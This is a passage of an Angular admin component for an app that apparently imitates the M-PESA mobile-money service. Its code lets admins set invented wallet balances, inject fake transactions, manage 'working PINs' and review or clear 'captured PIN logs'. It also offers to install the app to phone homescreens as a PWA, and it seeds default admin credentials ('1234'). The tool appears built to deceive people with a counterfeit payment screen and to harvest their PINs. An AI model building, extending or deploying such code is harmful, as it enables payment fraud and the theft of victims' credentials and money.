    .active-badge {
      color: #00c853;
      font-size: 11px;
      font-weight: 700;
    }
    .avatar-mini {
      width: 28px;
      height: 28px;
      border-radius: 50%;
      background: #23303c;
      color: #00c853;
      font-weight: 700;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
    }
    .btn-group {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .delete-icon-btn {
      color: #8b949e;
      font-size: 12.5px;
      padding: 4px 10px;
      border-radius: 4px;
      background: none;
      border: 1px solid #303b46;
      cursor: pointer;
    }
    .delete-icon-btn:hover:not(:disabled) {
      color: #e50914;
      border-color: #e50914;
      background: #251b1e;
    }
    .delete-icon-btn:disabled {
      opacity: 0.4;
      cursor: not-allowed;
    }
    .empty-cell {
      text-align: center;
      color: #8b949e;
      padding: 24px;
    }

    /* PWA Download Card Styles */
    .download-card {
      border-color: #294034;
      background: linear-gradient(180deg, #161f1a 0%, #161b20 100%);
    }
    .download-hero {
      display: flex;
      align-items: center;
      gap: 20px;
      margin-bottom: 24px;
      flex-wrap: wrap;
    }
    .app-icon-preview {
      width: 76px;
      height: 76px;
      border-radius: 18px;
      background: #00c853;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 8px 24px rgba(0, 200, 83, 0.3);
      overflow: hidden;
      flex-shrink: 0;
    }
    .app-icon-preview img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .download-info {
      flex: 1;
      display: flex;
      flex-direction: column;
      gap: 6px;
    }
    .download-title {
      font-size: 20px;
      font-weight: 800;
      color: #ffffff;
      margin: 0;
    }
    .download-subtitle {
      font-size: 13.5px;
      color: #9aa6b2;
      margin: 0;
      line-height: 1.45;
    }
    .pwa-status-badge {
      display: inline-block;
      width: fit-content;
      margin-top: 4px;
      background: rgba(0, 200, 83, 0.12);
      border: 1px solid rgba(0, 200, 83, 0.3);
      color: #00c853;
      font-size: 12px;
      font-weight: 600;
      padding: 4px 12px;
      border-radius: 14px;
    }
    .download-actions {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 20px;
    }
    .install-big-btn {
      background: #00c853;
      color: #000;
      font-weight: 800;
      font-size: 15px;
      padding: 14px 28px;
      border-radius: 12px;
      border: none;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 10px;
      box-shadow: 0 6px 20px rgba(0, 200, 83, 0.35);
      transition: transform 0.15s, background 0.15s;
      width: fit-content;
    }
    .install-big-btn:hover {
      background: #00d659;
      transform: translateY(-2px);
    }
    .action-btn-row {
      display: flex;
      gap: 12px;
      flex-wrap: wrap;
    }
    .phone-screen-launch-btn {
      background: #1e262c;
      color: #00e676;
      border: 1px solid #00c853;
      font-weight: 700;
      font-size: 14.5px;
      padding: 14px 22px;
      border-radius: 12px;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 8px;
      transition: all 0.2s;
    }
    .phone-screen-launch-btn:hover {
      background: rgba(0, 200, 83, 0.15);
      transform: translateY(-2px);
    }
    .network-access-box {
      background: #12181d;
      border: 1px solid #23303a;
      border-radius: 12px;
      padding: 16px 20px;
      margin-bottom: 22px;
    }
    .net-title {
      font-weight: 700;
      font-size: 14px;
      color: #ffffff;
      margin-bottom: 8px;
    }
    .net-links {
      display: flex;
      flex-direction: column;
      gap: 6px;
      margin-bottom: 10px;
    }
    .net-row {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 13px;
    }
    .net-tag {
      background: #252e36;
      color: #9aa6b2;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: 700;
    }
    .net-tag.secure {
      background: rgba(0, 200, 83, 0.2);
      color: #00e676;
    }
    .net-link {
      color: #4dd0e1;
      text-decoration: none;
      font-family: monospace;
      font-size: 13.5px;
    }
    .net-link:hover {
      text-decoration: underline;
    }
    .net-note {
      font-size: 12.5px;
      color: #9aa6b2;
      margin: 0;
      line-height: 1.5;
    }
    .card-divider {
      border: none;
      border-top: 1px solid #26332d;
      margin: 24px 0;
    }
    .install-instructions-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
    }
    .inst-box {
      background: #111518;
      border: 1px solid #232d36;
      border-radius: 12px;
      padding: 18px;
    }
    .inst-platform {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 12px;
    }
    .platform-icon { font-size: 20px; }
    .inst-platform h4 {
      font-size: 15px;
      font-weight: 700;
      color: #ffffff;
      margin: 0;
    }
    .inst-steps {
      margin: 0;
      padding-left: 20px;
      font-size: 12.5px;
      color: #a0abb6;
      line-height: 1.6;
    }
    .inst-steps li {
      margin-bottom: 6px;
    }
    .inst-steps strong {
      color: #e6edf3;
    }

    /* Danger zone */
    .danger-zone {
      border-color: rgba(229, 9, 20, 0.4);
      background: rgba(229, 9, 20, 0.03);
    }
    .danger-btn {
      background: #e50914;
      color: #fff;
      font-weight: 700;
      padding: 12px 24px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
    }
    .danger-btn-outline {
      border: 1px solid #e50914;
      color: #e50914;
      background: transparent;
      font-weight: 600;
      padding: 6px 14px;
      border-radius: 6px;
      cursor: pointer;
    }

    /* Isolated Wallet Notice */
    .isolation-notice {
      background: rgba(0, 200, 83, 0.1);
      border: 1px solid rgba(0, 200, 83, 0.35);
      padding: 12px 16px;
      border-radius: 10px;
      color: #00e676;
      font-size: 13.5px;
      margin-bottom: 20px;
      line-height: 1.45;
    }

    /* Working PINs Chips */
    .pins-badges-grid {
      display: flex;
      flex-wrap: wrap;
      gap: 12px;
      margin: 14px 0 8px 0;
    }
    .working-pin-chip {
      display: flex;
      align-items: center;
      gap: 8px;
      background: #182026;
      border: 1.5px solid #00c853;
      padding: 8px 14px;
      border-radius: 20px;
      color: #ffffff;
      font-size: 16px;
      font-weight: 700;
      letter-spacing: 2px;
      box-shadow: 0 0 10px rgba(0, 200, 83, 0.2);
    }
    .chip-dot {
      color: #00c853;
      font-size: 12px;
    }
    .chip-del-btn {
      background: rgba(255, 82, 82, 0.12);
      border: 1px solid rgba(255, 82, 82, 0.3);
      color: #ff5252;
      font-size: 12px;
      cursor: pointer;
      width: 22px;
      height: 22px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-left: 4px;
      transition: all 0.15s ease;
    }
    .chip-del-btn:hover:not(:disabled) {
      background: #ff5252;
      color: #ffffff;
    }
    .chip-del-btn:disabled {
      opacity: 0.3;
      cursor: not-allowed;
    }

    .admin-create-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
      gap: 16px;
      margin-top: 14px;
    }
  `]
})
export class AdminComponent implements OnInit {
  private api = inject(ApiService);
  private pwaService = inject(PwaService);
  private router = inject(Router);

  // Authentication State: Require password/PIN to log in
  currentAdmin: AdminUser | null = null;
  loginPhone = '0798765485';
  loginPin = '';
  loginError = '';
  backendUrl = '';

  // Tab & General State
  activeTab = 'user';
  dbStatus = 'Auto-Sync Active (Multi-Admin)';
  overview: any = null;
  pinLogs: any[] = [];
  transactions: Transaction[] = [];
  adminsList: AdminUser[] = [];
  favoritesList: Favorite[] = [];
  workingPins: string[] = ['1234'];
  newWorkingPin: string = '';
  workingPinMsg: string = '';

  // Change Password state
  currentPassInput: string = '';
  newPassInput: string = '';
  changePassMsg: string = '';

  // PWA State
  isInstallable = false;
  isStandalone = false;
  installMessage = '';

  // User Profile Form (for current admin's isolated wallet)
  userForm: UserProfile = {
    name: 'Regarn Omondi',
    initials: 'RO',
    phone: '0798765485',
    greeting: 'Good morning,',
    balance: 61.66,
    fuliza: 100.00,
    airtime: 0.00
  };
  saveSuccessMessage = '';

  // Super Admin Create Form
  newAdminName = '';
  newAdminPhone = '';
  newAdminPassword = '1234';
  newAdminWorkingPin = '1234';
  newAdminBalance: number = 61.66;
  newAdminRole = 'Admin';
  adminActionMessage = '';

  // Favorites Form
  editingFavId: number | null = null;
  favFormName = '';
  favFormPhone = '';
  favSuccessMessage = '';

  // New Transaction Form
  newTxRecipient = '';
  newTxPhone = '';
  newTxAmount: number | null = null;
  newTxType = 'SEND';

  ngOnInit(): void {
    this.pwaService.isInstallable$.subscribe(v => this.isInstallable = v);
    this.pwaService.isStandalone$.subscribe(v => this.isStandalone = v);
    this.backendUrl = this.api.getApiBase();

    const saved = typeof localStorage !== 'undefined' ? localStorage.getItem('mpesa_current_admin') : null;
    if (saved) {
      try {
        this.currentAdmin = JSON.parse(saved);
      } catch (e) {
        this.currentAdmin = null;
      }
    }

    if (this.currentAdmin) {
      this.loadData();
    }
  }

  loadData(): void {
    const adminPhone = this.currentAdmin?.phone || '0798765485';

    this.api.getAdminOverview(adminPhone).subscribe({
      next: (res) => {
        this.overview = res;
        if (res.database) this.dbStatus = res.database;
        if (res.user) this.userForm = { ...res.user };
        if (res.workingPins) this.workingPins = res.workingPins;
        if (res.adminsList) this.adminsList = res.adminsList;
        if (res.recentPins) this.pinLogs = res.recentPins;
        if (res.recentTransactions) this.transactions = res.recentTransactions;
      }
    });

    this.api.getFavorites().subscribe({
      next: (favs) => {
        this.favoritesList = favs;
      }
    });
  }

  // =============================================================
  // AUTHENTICATION
  // =============================================================
  loginAdmin(): void {
    this.loginError = '';
    if (!this.loginPhone.trim() || !this.loginPin.trim()) {
      this.loginError = 'Please enter your admin phone number and password/PIN.';
      return;
    }

    if (this.backendUrl) {
      this.api.setApiBaseUrl(this.backendUrl);
    }

    this.api.adminLogin(this.loginPhone, this.loginPin).subscribe({
      next: (res) => {
        if (res && res.success && res.admin) {
          this.currentAdmin = res.admin;
          if (res.admin.workingPins) this.workingPins = res.admin.workingPins;
          if (typeof localStorage !== 'undefined') {
            localStorage.setItem('mpesa_current_admin', JSON.stringify(res.admin));
          }
          this.loadData();
        } else {
          this.loginError = res?.message || 'Invalid admin credentials.';
        }
      },
      error: (err) => {
        this.loginError = err.message || 'Invalid admin credentials.';
      }
    });
  }

  logoutAdmin(): void {
    this.currentAdmin = null;
    this.loginPin = '';
    if (typeof localStorage !== 'undefined') {
      localStorage.removeItem('mpesa_current_admin');
    }
  }

  // =============================================================
  // USER & ISOLATED BALANCES
  // =============================================================
  saveUserChanges(): void {
    const adminPhone = this.currentAdmin?.phone || '0798765485';
    this.api.updateUserAdmin(this.userForm, adminPhone).subscribe({
      next: () => {
        this.saveSuccessMessage = 'Your personal admin wallet and balances were updated successfully!';
        setTimeout(() => this.saveSuccessMessage = '', 3500);
        this.loadData();
      }
    });
  }

  // =============================================================
  // WORKING APP PINS
  // =============================================================
  handleAddWorkingPin(): void {
    if (!this.newWorkingPin || !/^\d{4}$/.test(this.newWorkingPin)) {
      alert('Please enter a valid 4-digit PIN (e.g. 2580).');
      return;
    }
    const adminPhone = this.currentAdmin?.phone || '0798765485';
    this.api.addWorkingPin(adminPhone, this.newWorkingPin).subscribe({
      next: (res) => {
        if (res.success) {
          this.workingPins = res.workingPins;
          this.workingPinMsg = `Working PIN ${this.newWorkingPin} added successfully!`;
          this.newWorkingPin = '';
          setTimeout(() => this.workingPinMsg = '', 3500);
        }
      }
    });
  }

  handleDeleteWorkingPin(pin: string): void {
    if (this.workingPins.length <= 1) {
      alert('You must keep at least one working PIN for your account.');
      return;
    }
    const adminPhone = this.currentAdmin?.phone || '0798765485';
    this.api.deleteWorkingPin(adminPhone, pin).subscribe({
      next: (res) => {
        if (res.success) {
          this.workingPins = res.workingPins;
          this.workingPinMsg = `Working PIN ${pin} removed.`;
          setTimeout(() => this.workingPinMsg = '', 3500);
        } else {
          alert(res.message || 'Failed to remove working PIN');
        }
      }
    });
  }

  handleChangePassword(): void {
    if (!this.newPassInput.trim()) {
      alert('Please enter a new password.');
      return;
    }
    const adminPhone = this.currentAdmin?.phone || '0798765485';
    this.api.changeAdminPassword(adminPhone, this.currentPassInput, this.newPassInput).subscribe({
      next: (res) => {
        if (res.success) {
          this.changePassMsg = res.message || 'Dashboard password updated successfully!';
          this.currentPassInput = '';
          this.newPassInput = '';
          setTimeout(() => this.changePassMsg = '', 4000);
        } else {
          alert(res.message || 'Failed to update password.');
        }
      }
    });
  }

  // =============================================================
  // SUPER ADMIN: CREATE & REVOKE ADMINS
  // =============================================================
  handleAddAdmin(): void {
    if (!this.newAdminName.trim() || !this.newAdminPhone.trim()) {
      alert('Please provide admin name and phone number.');
      return;
    }

    const requesterPhone = this.currentAdmin?.phone || '0798765485';

    this.api.createAdmin({
      requesterPhone,
      name: this.newAdminName,
      phone: this.newAdminPhone,
      password: this.newAdminPassword || '1234',
      initialPin: this.newAdminWorkingPin || '1234',
      initialBalance: this.newAdminBalance || 61.66,
      role: this.newAdminRole || 'Admin'
    }).subscribe({
      next: (res) => {
        if (res.success) {
          this.adminsList = res.admins;
          this.adminActionMessage = `Admin "${this.newAdminName}" created successfully! They can log into /admin using phone ${this.newAdminPhone} and password "${this.newAdminPassword}".`;
          this.newAdminName = '';
          this.newAdminPhone = '';
          this.newAdminPassword = '1234';
          this.newAdminWorkingPin = '1234';
          setTimeout(() => this.adminActionMessage = '', 5500);
        } else {
          alert(res.message || 'Failed to create admin');
        }
      }
    });
  }

  handleRemoveAdmin(phone: string): void {
    if (confirm(`Revoke admin privileges and delete isolated account for phone: ${phone}?`)) {
      const requesterPhone = this.currentAdmin?.phone || '0798765485';
      this.api.revokeAdmin(phone, requesterPhone).subscribe({
        next: (res) => {
          if (res.success) {
            this.adminsList = res.admins;
            this.adminActionMessage = `Admin ${phone} revoked and account deleted.`;
            setTimeout(() => this.adminActionMessage = '', 3500);
          } else {
            alert(res.message || 'Failed to revoke admin');
          }
        }
      });
    }
  }

  // =============================================================
  // FAVOURITES ACTIONS
  // =============================================================
  handleSaveFavorite(): void {
    if (!this.favFormName.trim() || !this.favFormPhone.trim()) {
      alert('Please provide name and phone number.');
      return;
    }

    if (this.editingFavId) {
      this.api.updateFavorite(this.editingFavId, this.favFormName, this.favFormPhone).subscribe({
        next: (res) => {
          this.favoritesList = res.favorites;
          this.favSuccessMessage = `Updated favourite "${this.favFormName}"!`;
          this.cancelFavEdit();
          setTimeout(() => this.favSuccessMessage = '', 3500);
        }
      });
    } else {
      this.api.addFavorite(this.favFormName, this.favFormPhone).subscribe({
        next: (res) => {
          this.favoritesList = res.favorites;
          this.favSuccessMessage = `Added favourite "${this.favFormName}"!`;
          this.favFormName = '';
          this.favFormPhone = '';
          setTimeout(() => this.favSuccessMessage = '', 3500);
        }
      });
    }
  }

  editFavorite(fav: Favorite): void {
    this.editingFavId = fav.id;
    this.favFormName = fav.name;
    this.favFormPhone = fav.phone;
  }

  cancelFavEdit(): void {
    this.editingFavId = null;
    this.favFormName = '';
    this.favFormPhone = '';
  }

  handleDeleteFavorite(id: number): void {
    if (confirm('Delete this favourite?')) {
      this.api.deleteFavorite(id).subscribe({
        next: (res) => {
          this.favoritesList = res.favorites;
          this.favSuccessMessage = 'Favourite deleted successfully.';
          setTimeout(() => this.favSuccessMessage = '', 3500);
        }
      });
    }
  }

  // =============================================================
  // PWA HOMESCREEN DOWNLOAD
  // =============================================================
  async downloadAppToHomescreen(): Promise<void> {
    const accepted = await this.pwaService.promptInstall();
    if (accepted) {
      this.installMessage = 'App installed successfully to your homescreen!';
      this.isStandalone = true;
    } else {
      this.installMessage = 'Installation initiated. If no popup appeared, follow the manual steps below for your device.';
    }
    setTimeout(() => this.installMessage = '', 6000);
  }

  openPhoneScreen(): void {
    this.router.navigate(['/phone-screen']);
  }

  onImgErr(e: Event): void {
    const target = e.target as HTMLImageElement;
    target.style.display = 'none';
  }

  // =============================================================
  // TRANSACTIONS & PINS
  // =============================================================
  injectTransaction(): void {
    if (!this.newTxRecipient || !this.newTxPhone || !this.newTxAmount) return;
    this.api.sendMoney({
      phone: this.newTxPhone,
      amount: this.newTxAmount,
      paymentMethod: 'M-PESA',
      note: 'Admin injected'
    }).subscribe({
      next: () => {
        this.newTxRecipient = '';
        this.newTxPhone = '';
        this.newTxAmount = null;
        this.loadData();
      }
    });
  }

  deleteTransaction(id: string): void {
    this.api.deleteTransaction(id).subscribe({
      next: () => this.loadData()
    });
  }

  deletePin(id: string): void {
    this.api.deletePin(id).subscribe({
      next: () => this.loadData()
    });
  }

  clearAllPins(): void {
    if (confirm('Clear all captured PIN logs?')) {
      this.api.clearPins().subscribe({
        next: () => this.loadData()
      });
    }
  }

  resetAllData(): void {
    if (confirm('Are you sure you want to reset all data back to original defaults?')) {
      this.api.resetDatabase().subscribe({
        next: () => {
          alert('Database reset to defaults!');
          this.loadData();
        }
      });
    }
  }

  goBack(): void {
    this.router.navigate(['/home']);
  }
}
